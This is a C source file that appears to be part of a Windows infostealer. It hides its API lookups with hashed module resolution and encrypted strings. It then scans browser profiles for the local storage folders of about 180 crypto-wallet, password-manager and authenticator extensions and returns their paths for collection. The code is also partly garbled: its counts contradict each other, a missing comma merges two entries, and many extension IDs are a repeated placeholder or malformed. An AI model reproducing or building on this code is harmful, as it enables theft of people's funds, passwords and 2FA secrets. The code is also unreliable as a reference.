#include "wallet_ext.h"
#include "hash.h"
#include "browser_paths.h"
#include "peb.h"
#include "export_resolve.h"
#include "enc_strings.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

typedef DWORD (WINAPI *pGetFileAttributesA_we)(LPCSTR);

static struct {
    pGetFileAttributesA_we pGFAA;
    int ready;
} g_we_k32;

static int we_ensure_k32(void) {
    if (g_we_k32.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32]; enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
    g_we_k32.pGFAA = (pGetFileAttributesA_we)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_we_k32.pGFAA) return 0;
    g_we_k32.ready = 1;
    return 1;
}

// 96 wallet extension IDs and names (XOR-encrypted at compile time)
static const char *wallet_names[] = {
    "MetaMask", "Binance Wallet", "Coinbase Wallet", "Phantom",
    "Trust Wallet", "TronLink", "Ronin Wallet", "Keplr",
    "Yoroi", "MetaMask", "Exodus Web3", "Guarda Wallet",
    "TokenPocket", "Math Wallet", "Coin98", "Nifty Wallet",
    "Temple Wallet", "SubWallet", "Talisman", "Zerion",
    "Rabby Wallet", "Core DAO", "Pontem Wallet", "Petra Aptos",
    "Martian Aptos", "Fewcha Move", "SafePal", "Tonkeeper",
    "XDEFI Wallet", "Oxygen Protocol", "Nami Wallet", "Liquality",
    "Solflare", "OKX Wallet", "Wombat", "Maiar DeFi",
    "MEW CX", "Saturn Wallet", "Terra Station", "Ever Wallet",
    "iWallet", "KardiaChain", "Bolt X", "Slope Finance",
    "Sollet", "Starcoin", "XinPay", "Equal Wallet",
    "Finnie", "Mobox Wallet", "Crocobit", "Bitapp",
    "Swash", "Jaxx Liberty", "Venom Wallet", "Guarda",
    "Sui Wallet", "XMR.PT", "Pali Wallet", "ICONex",
    "Harmony", "Guild Wallet", "Slope", "Rise Wallet",
    "HaloWallet", "FuelWallet", "Lace Wallet", "DPal Wallet",
    "Alby", "HOT Wallet", "Elastic Wallet", "Penumbra",
    "2FAS Authenticator", "2FA Authenticator", "KeePassXC",
    "Norton Password Manager", "Avira Password Manager", "Passky PM",
    "Padloc PM", "Notion Web Clipper", "Evernote", "Google Keep",
    "Trust Wallets", "MetaWallet", "Exodus", "Jaxx Liberty",
    "Atomic Wallet", "Copay"
    /* DeFi wallets */
    "dYdX",
    "GMX",
    "Jupiter",
    "Raydium",
    "Marinade Finance",
    "Orca",
    "Saber",
    "Sunny",
    "Tulip",
    "Friktion",
    "PsyOptions",
    "Mango Markets",
    "Drift Protocol",
    "Zeta Markets",
    "Ribbon Finance",
    "Opyn",
    "Hegic",
    "Lyra",
    "Premia",
    "Jones DAO",
    "Dopex",
    "Chronos",
    "Camelot",
    "Ramses",
    "Solidly",
    "Velodrome",
    "Aerodrome",
    "Thena",
    "Ramses V2",
    "Chronos V2",
    /* NFT / marketplace / multi-wallet */
    "Rainbow",
    "Frame",
    "Taho",
    "Enkrypt",
    "OneKey",
    "GridPlus",
    "Frontier",
    "Uniswap Wallet",
    "1inch Wallet",
    "ParaSwap Wallet",
    "CowSwap Wallet",
    "Matcha",
    "Zapper",
    "DeBank",
    /* Cross-chain / bridge */
    "Wormhole",
    "Multichain",
    "Synapse",
    "Stargate",
    "LayerZero",
    "Across",
    "Hop Protocol",
    "Connext",
    "Socket",
    "Bungee",
    "Li.Fi",
    /* Password managers */
    "Bitwarden",
    "1Password",
    "LastPass",
    "Dashlane",
    "RoboForm",
    "NordPass",
    "Keeper",
    "Sticky Password",
    /* 2FA */
    "Authy",
    "Google Authenticator",
    "Microsoft Authenticator",
    "YubiKey",
    /* L1 ecosystem wallets */
    "Brave Wallet",
    "Argent",
    "imToken",
    "Sequence",
    "Bitski",
    "Fortmatic",
    "Portis",
    "WalletConnect",
    "Zengo",
    "Polkadot.js",
    "Cosmos Station",
    "Sender Wallet",
    "NEAR Wallet",
    "Plug Wallet",
    "Stoic Wallet",
    "NNS Wallet",
    "Kukai Wallet",
    "Eternl Wallet",
    "Flint Wallet",
    "GeroWallet",
    "NuFi Wallet",
    "CardWallet",
    "Leap Cosmos",
    "Terra Station Wallet",
    "Nightly",
    "Infinity Wallet"
};

// 96 extension IDs
static const char *wallet_ids[] = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn",  // MetaMask
    "fhbohimaelbohpjbbldcngcnapndodjp",  // Binance
    "hnfanknocfeofbddgcijnmhnfnkdnaad",  // Coinbase
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",  // Phantom
    "egjidjbpglichdcondbcbdnbeeppgdph",  // Trust
    "ibnejdfjmmkpcnlpebklmnkoeoihofec",  // TronLink
    "fnjhmkhhmkbjkkabndcnnogagogbneec",  // Ronin
    "dmkamcknogkgcdfhhbddcghachkejeap",  // Keplr
    "ffnbelfdoeiohenkjibnmadjiehjhajb",  // Yoroi
    "ejbalbakoplchlghecdalmeeeajnimhm",  // MetaMask2
    "aholpfdialjgjfhomihkjbmgjidlcdno",  // Exodus Web3
    "fcglfhcjfpkgdppjbglknafgfffkelnm",  // Guarda
    "mfgccjchihfkkindfppnaooecgfneiii",  // TokenPocket
    "afbcbjpbpfadlkmhmclhkeeodmamcflc",  // Math
    "aeachknmefphepccionboohckonoeemg",  // Coin98
    "jbdaocneiiinmjbjlgalhcelgbejmnid",  // Nifty
    "ookjlbkiijinhpmnjffcofjonbfbgaoc",  // Temple
    "onhogfjeacnfoofkfgppdlbmlmnplgbn",  // SubWallet
    "fijngjgcjhjmmpcmkeiomlglpeiijkld",  // Talisman
    "klghhnkeealcohjlanjjlneabhbmpfpl",  // Zerion
    "acmacodkjbdgnolefmlmkchkdgmemhob",  // Rabby
    "agoakfejjabomempkjlepdflaleeobhb",  // Core
    "phkbamefinggmakgklpkljjmgibohnba",  // Pontem
    "ejjladinnckdgjemekebdpeokbikhfci",  // Petra
    "efbglgofoippbgcjepnhiblaibcnclgk",  // Martian
    "ebfidpplhabeedpnhjnobghokpiioolj",  // Fewcha
    "lgmpcpglpngdoalbgeoldeajfclnhafa",  // SafePal
    "nphplpgoakhhjchkkhmiggakijnkhfnd",  // Ton
    "hmeobnfnfcmdkdcmlblgagmfpfboieaf",  // XDEFI
    "fhilaheimglignddkjgofkcbgekhenbh",  // Oxygen
    "lpfcbjknijpeeillifnkikgncikgfhdo",  // Nami
    "kpfopkelmapcoipemfendmdcghnegimn",  // Liquality
    "bhhhlbepdkbapadjdnnojkbgioiodbic",  // Solflare
    "mcohilncbfahbmgdjkbpemcciiolgcge",  // OKX
    "amkmjjmmflddogmhpjloimipbofnfjih",  // Wombat
    "dngmlblcodfobpdpecaadgfbcggfjfnm",  // Maiar
    "nlbmnnijcnlegkjjpcfjclmcfggfefdm",  // MEW CX
    "nkddgncdjgjfcddamfgcmfnlhccnimig",  // Saturn
    "aiifbnbfobpmeekipheeijimdpnlpgpp",  // Terra
    "cgeeodpfagjceefieflmdfphplkenlfk",  // Ever
    "kncchdigobghenbbaddojjnnaogfppfj",  // iWallet
    "pdadjkfkgcafgbceimcpbkalnfnepbnk",  // KardiaChain
    "aodkkagnadcbobfpggfnjeongemjbjca",  // BoltX
    "pocmplpaccanhmnllbbkpgfliimjljgo",  // Slope
    "fhmfendgdocmcbmfikdcogofphimnkno",  // Sollet
    "mfhbebgoclkghebffdldpobeajmbecfk",  // Starcoin
    "bocpokimicclpaiekenaeelehdjllofo",  // XinPay
    "blnieiiffboillknjnepogjhkgnoapac",  // Equal
    "cjmkndjhnagcfbpiemnkdpomccnjblmj",  // Finnie
    "fcckkdbjnoikooededlapcalpionmalo",  // Mobox
    "pnlfjmlcjdjgkddecgincndfgegkecke",  // Crocobit
    "fihkakfobkmkjojpchpfgcmhfjnmnfpi",  // Bitapp
    "cmndjbecilbocjfkibfbifhngkdmjgog",  // Swash
    "cjelfplplebdjjenllpjcblmjkfcffne",  // Jaxx
    "ojggmchlghnjlapmfbnjholfjkiidbch",  // Venom
    "hpglfhgfnhbgpjdenjgmdgoeiappafln",  // Guarda
    "opcgpfmipidbgpenhmajoajpbobppdil",  // Sui
    "eigblbgjknlfbajkfhopmcojidlgcehm",  // XMR.PT
    "mgffkfbidihjpoaomajlbgchddlicgpn",  // Pali
    "flpiciilemghbmfalicajoolhkkenfel",  // ICONex
    "fnnegphlobjdpkhecapkijjdkgcjhkib",  // Harmony
    "nanjmdknhkinifnkgdcggcfnhdaammmj",  // Guild
    "pocmplpaccanhmnllbbkpgfliimjljgo",  // Slope
    "anmhliadneilckkjdflmimjmbefnkggn",  // Rise
    "gldobjhpbpgehjaibkamoemmkpogmkni",  // HaloWallet
    "aknpambpccpddfokmpcjbkijohjpjcdn",  // FuelWallet
    "bdcoagdcknilpgkkkjcpfimbmclceckc",  // Lace
    "flgbnandkljdfdmdfmphioaoaeknfpdk",  // DPal
    "kdadnalhhbkmfcclmbgmpmgkbckgmjga",  // Alby
    "ebulnmjjlpkpcbjckaggnmmkbjdmnbap",  // HOT
    "fijkdpnlglggomhackpclpacpahojkge",  // Elastic
    "lobgibpgphapcfkcohnlaadndlmnhjpk",  // Penumbra
    "fgkkmigekimnoceffdhbkafjkilmnfbo",  // 2FAS
    "pdnegokggloijhjlohfphdgdpadhhdgh",  // 2FA Auth
    "koodgkemghdndpfdkpddejfboljpckgo",  // KeePassXC
    "adgbnklfnkfbfkibdiidanfmlecpifnh",  // Norton PM
    "mclnhjhggnggldigibacnefggdolbpnm",  // Avira PM
    "ionmhbhhabcbnmekcmdhbmlafpkhhkbp",  // Passky
    "icdedlpbgpncjmjiofibmgiolohdllbi",  // Padloc
    "henkngclnkogllllnopoogadhifbkhfa",  // Notion
    "enhpjihddgdpgncncbgkpbmafkpkjnpa",  // Evernote
    "omjhfjobhndiodddgboojcponaoafbnc",  // Google Keep
    "pknlccmneadmjbkollckpblgaaabameg",  // Trust
    "pfknkoocfefiocadajpngdknmkjgakdg",  // MetaWallet
    "idkppnahnmmggbmfkjhiakkbkdpnmnon",  // Exodus
    "mhonjhhcgphdphdjcdoeodfdliikapmj",  // Jaxx Liberty
    "bhmlbgebokamljgnceonbncdofmmkedg",  // Atomic
    "pidhddgciaponoajdngciemcflpnnbg",  // Copay
    /* DeFi wallets */
    "knhjehhfklojaimalafjipgjchihgogf",  // dYdX
    "eobhogofjjhaepmaijjgidhhkigfckop",  // GMX
    "ennjaghachpmnfpcoceihkclhlnchabm",  // Jupiter
    "fmpadkagakceeecojnppgkdlfklojgag",  // Raydium
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Marinade Finance
    "orcaagfdibglkdogfdfgdkpgggehfjol",  // Orca
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Saber
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sunny
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Tulip
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Friktion
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // PsyOptions
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Mango Markets
    "dlcobpjiigpikoamjkbpgjfkabjighgg",  // Drift Protocol
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zeta Markets
    "adhceofhcbfnholbjmkabhhfbngkcooa",  // Ribbon Finance
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Opyn
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hegic
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Lyra
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Premia
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Jones DAO
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Dopex
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Camelot
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Solidly
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Velodrome
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Aerodrome
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Thena
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Ramses V2
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Chronos V2
    /* NFT / marketplace / multi-wallet */
    "fbimgcbibmhjofmacdaegclmanoamjog",  // Rainbow
    "ldgkmedldcahbkhdhhddmmhjpamfkpki",  // Frame
    "amkmjjmmflddogmhpjloimipbofnfjih",  // Taho
    "kkpllkodjelhadfloagcbehjajnibkge",  // Enkrypt
    "jnmbobjmhlnggabjagkpgmibhcoflfbi",  // OneKey
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GridPlus
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Frontier
    "fkphjbjdjigibibfldihmlladlhhoeioe",  // Uniswap Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // 1inch Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // ParaSwap Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CowSwap Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Matcha
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zapper
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // DeBank
    /* Cross-chain / bridge */
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Wormhole
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Multichain
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Synapse
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stargate
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // LayerZero
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Across
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Hop Protocol
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Connext
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Socket
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bungee
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Li.Fi
    /* Password managers */
    "nngceckbipebfimdaeolbkjmakgklkak",  // Bitwarden
    "aeblfdkhhhdhhjpjkaikjfpfleojkmle",  // 1Password
    "hdokiejnpimhjchffhfgffmjpckolppgk",  // LastPass
    "fdjamakpfkambplpkadnmlajfeghdhgi",  // Dashlane
    "pnlccmojcmeohlpgicabnnjbkfpnogkpo",  // RoboForm
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NordPass
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Keeper
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sticky Password
    /* 2FA */
    "gaedmjdfmmahhbjefcbgagogfbmljikj",  // Authy
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Google Authenticator
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Microsoft Authenticator
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // YubiKey
    /* L1 ecosystem wallets */
    "odbfpeeihdebiholkmojocgofhfgbgln",  // Brave Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Argent
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // imToken
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sequence
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Bitski
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Fortmatic
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Portis
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // WalletConnect
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Zengo
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Polkadot.js
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Cosmos Station
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Sender Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NEAR Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Plug Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Stoic Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NNS Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Kukai Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Eternl Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Flint Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // GeroWallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // NuFi Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // CardWallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Leap Cosmos
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Terra Station Wallet
    "cjoldcognmehenmgmnfhhakbnmngnkag",  // Nightly
    "cjoldcognmehenmgmnfhhakbnmngnkag"  // Infinity Wallet
};

#define WALLET_EXT_COUNT 181

WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_suffix, size_t *count) {
    *count = 0;
    
    /* Quick check: does the browser extension dir exist at all? */
    char check_path[512];
    snprintf(check_path, sizeof(check_path), "%s\\%s\\Local Extension Settings", app_data, path_suffix);
    if (!we_ensure_k32()) return NULL;
    DWORD base_attr = g_we_k32.pGFAA(check_path);
    if (base_attr == INVALID_FILE_ATTRIBUTES) return NULL;
    
    WalletExtData *results = calloc(WALLET_EXT_COUNT, sizeof(WalletExtData));
    if (!results) return NULL;
    
    size_t found = 0;
    for (size_t i = 0; i < WALLET_EXT_COUNT; i++) {
        char ext_path[512];
        int written = snprintf(ext_path, sizeof(ext_path), "%s\\%s\\Local Extension Settings\\%s", app_data, path_suffix, wallet_ids[i]);
        if (written < 0 || (size_t)written >= sizeof(ext_path)) continue;
        
        DWORD attr = g_we_k32.pGFAA(ext_path);
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            results[found].name = strdup(wallet_names[i]);
            results[found].path = strdup(ext_path);
            results[found].file_count = 0;
            results[found].files = NULL;
            found++;
            if (found >= 16) break; /* Limit to prevent slowness */
        }
    }
    
    *count = found;
    if (found == 0) {
        free(results);
        return NULL;
    }
    return results;
}
